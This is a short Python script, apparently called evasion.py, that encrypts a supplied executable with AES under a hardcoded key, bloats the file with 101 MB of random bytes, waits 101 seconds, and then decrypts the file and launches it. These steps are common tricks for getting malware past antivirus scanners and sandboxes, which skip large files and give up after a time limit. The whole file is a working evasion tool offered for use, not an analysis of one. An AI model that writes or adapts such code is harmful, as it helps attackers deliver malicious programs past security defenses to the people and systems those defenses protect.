from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
import time
import subprocess
import sys

def encrypt_file(input_file, output_file, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(input_file, 'rb') as f:
        plaintext = f.read()
    
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    with open(output_file, 'wb') as f:
        f.write(cipher.iv)
        f.write(ciphertext)
    
    print(f"{input_file} encrypted and saved as {output_file}")
    return len(ciphertext)  

def decrypt_file(input_file, output_file, key, original_size):
    with open(input_file, 'rb') as f:
        iv = f.read(16)
        ciphertext = f.read()

    ciphertext = ciphertext[:original_size] 

    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    
    with open(output_file, 'wb') as f:
        f.write(plaintext)
    
    print(f"{input_file} decrypted and saved as {output_file}")
    subprocess.run([output_file])  

def increase_file_size(file_path, size_in_mb=101):
    with open(file_path, 'ab') as f:
        f.write(os.urandom(size_in_mb * 1024 * 1024))  
    print(f"{file_path} size increased by {size_in_mb} MB")

def check_time_and_sleep():
    start_time = time.time()
    time.sleep(101)  
    elapsed_time = time.time() - start_time
    if elapsed_time >= 101:
        print("101 seconds have passed. Proceed with decryption.")
        return True
    else:
        print("101 seconds have not passed. Do not decrypt.")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python evasion.py <path_to_program>")
        sys.exit(1)

    input_file = sys.argv[1]  
    if not os.path.isfile(input_file):
        print(f"File {input_file} does not exist.")
        sys.exit(1)

    desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    key = b'Sixteen byte key'  
    encrypted_file = os.path.join(desktop_path, 'encrypted_file.exe')
    decrypted_file = os.path.join(desktop_path, 'decrypted_file.exe')

    original_size = encrypt_file(input_file, encrypted_file, key)

    increase_file_size(encrypted_file)

    if check_time_and_sleep():
        decrypt_file(encrypted_file, decrypted_file, key, original_size)
    else:
        print("Decryption not performed.")

if __name__ == '__main__':
    main()